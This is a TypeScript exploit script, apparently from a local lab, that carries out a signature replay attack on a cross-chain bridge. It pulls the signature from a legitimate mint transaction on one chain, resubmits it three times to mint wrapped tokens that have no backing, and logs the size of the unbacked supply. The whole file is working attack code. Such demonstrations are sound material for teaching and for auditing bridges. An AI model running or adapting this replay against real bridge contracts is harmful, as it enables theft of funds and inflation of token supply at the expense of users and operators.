import { JsonRpcProvider, Wallet, Contract, formatUnits } from "ethers";
import * as fs from "fs";
import { CHAIN_A_URL, CHAIN_B_URL, ATTACKER_KEY } from "./config";

function loadAbi(name: string) {
  return JSON.parse(
    fs.readFileSync(`artifacts/contracts/${name}.sol/${name}.json`, "utf8")
  ).abi;
}

async function main() {
  const addrs = JSON.parse(fs.readFileSync("deployments.json", "utf8"));
  const opts = { cacheTimeout: -1 };
  const providerA = new JsonRpcProvider(CHAIN_A_URL, undefined, opts);
  const providerB = new JsonRpcProvider(CHAIN_B_URL, undefined, opts);

  const attacker = new Wallet(ATTACKER_KEY, providerB);
  const mint = new Contract(addrs.mint, loadAbi("BridgeMint"), attacker);
  const wrapped = new Contract(addrs.wrapped, loadAbi("WrappedToken"), providerB);
  const token = new Contract(addrs.token, loadAbi("TestToken"), providerA);

  // Step 1: find the legitimate mint transaction on Chain B (it is public)
  const events = await mint.queryFilter(mint.filters.Minted(), 0, "latest");
  if (events.length === 0) throw new Error("No mint found. Run deposit.ts first.");
  const tx = await providerB.getTransaction((events[0] as any).transactionHash);
  const parsed = mint.interface.parseTransaction({ data: tx!.data });
  const [to, amount, signature] = parsed!.args;
  console.log(`Copied signature from the legitimate mint to ${to}`);

  // Step 2: submit the same signature again, 3 times
  for (let i = 1; i <= 3; i++) {
    await (await mint.mintWithSignature(to, amount, signature)).wait();
    console.log(`Replay #${i} accepted`);
  }

  const locked = await token.balanceOf(addrs.lock);
  const supply = await wrapped.totalSupply();
  console.log(`Locked on Chain A:        ${formatUnits(locked, 18)} TOK`);
  console.log(`wTOK supply on Chain B:   ${formatUnits(supply, 18)} wTOK`);
  console.log(`Unbacked wTOK:            ${formatUnits(supply - locked, 18)}`);
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
